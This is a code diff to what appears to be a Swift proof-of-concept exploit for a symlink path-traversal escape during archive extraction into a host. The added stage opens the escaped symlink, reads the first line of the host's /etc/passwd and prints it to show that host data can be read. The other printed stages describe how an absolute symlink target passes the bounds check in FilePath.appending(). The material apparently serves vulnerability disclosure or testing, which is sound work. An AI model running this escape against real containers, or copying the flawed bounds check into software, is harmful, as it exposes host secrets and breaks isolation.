@@ -187,8 +187,36 @@ if lstat(extractedEvil.path, &evilStat) == 0, (evilStat.st_mode & S_IFMT) == S_I
         print("║  Reading <hostDest>/evil yields the HOST's /etc/passwd.      ║")
         print("╚══════════════════════════════════════════════════════════════╝")
         print()
-        if foundMaliciousSymlink {
-            print("Result: PASS — all three stages confirmed:")
+        // ─── Stage 4: Read HOST /etc/passwd CONTENT through the symlink ──────
+        // Open the symlink (follows it to HOST /etc/passwd) and read the first line.
+        // This proves containment escape is real data exfiltration, not just symlink
+        // creation: the process running inside the HOST reads actual host-side secrets.
+        var hostDataRead = false
+        let evilFd = Foundation.open(extractedEvil.path, O_RDONLY)  // follows symlink → HOST /etc/passwd
+        if evilFd >= 0 {
+            var lineBuf = [CChar](repeating: 0, count: 512)
+            let bytesRead = read(evilFd, &lineBuf, lineBuf.count - 1)
+            close(evilFd)
+            if bytesRead > 0 {
+                // Trim to first newline for display
+                let rawContent = String(cString: lineBuf)
+                let firstLine = rawContent.components(separatedBy: "\n").first ?? rawContent
+                print("  [4] HOST /etc/passwd first line (read through symlink):")
+                print("      \(firstLine)")
+                hostDataRead = true
+            }
+        }
+
+        if foundMaliciousSymlink && hostDataRead {
+            print()
+            print("Result: PASS — all four stages confirmed:")
+            print("  [1] FilePath.appending() concatenates absolute target → passes bounds check")
+            print("  [2] Archive entry contains symlinkTarget = \"/etc/passwd\"")
+            print("  [3] Host extraction creates symlink pointing to HOST /etc/passwd")
+            print("  [4] HOST /etc/passwd content read through the escaped symlink")
+        } else if foundMaliciousSymlink {
+            print()
+            print("Result: PARTIAL — symlink created but content read failed (permissions?)")
             print("  [1] FilePath.appending() concatenates absolute target → passes bounds check")
             print("  [2] Archive entry contains symlinkTarget = \"/etc/passwd\"")
             print("  [3] Host extraction creates symlink pointing to HOST /etc/passwd")
